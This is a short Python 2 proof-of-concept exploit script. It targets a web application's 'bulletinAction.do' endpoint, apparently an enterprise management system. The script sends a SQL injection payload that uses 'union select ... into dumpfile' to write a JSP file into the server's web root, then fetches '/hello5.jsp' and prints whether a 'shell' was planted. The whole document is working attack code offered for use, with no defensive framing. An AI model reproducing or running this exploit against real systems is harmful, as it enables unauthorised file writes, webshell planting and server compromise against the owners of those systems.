import requests
import json
import sys
def post_shell(url):
    headers = {'content-type': 'application/json'}
    rqs = '/Conf/jsp/systembulletin/bulletinAction.do?operator=details'
    opq = url+rqs
    poc = ("sysId=-1 union select 0x68656c6c6f,'','','',''into dumpfile '../../management/webapps/root/hello5.jsp'%23'")
    urlcode = requests.post(opq,headers=headers,params=poc)
def get_url(url):
    lujing = '/hello5.jsp'
    shellcode = url+lujing
    r = requests.get(shellcode)
    if r.status_code == 200:
        print 'shell:'+shellcode
    else:
        print 'not shell'
if __name__=='__main__':
    if len(sys.argv) == 2:
        post_shell(sys.argv[1])
        get_url(sys.argv[1])
    else:
        sys.exit(0)
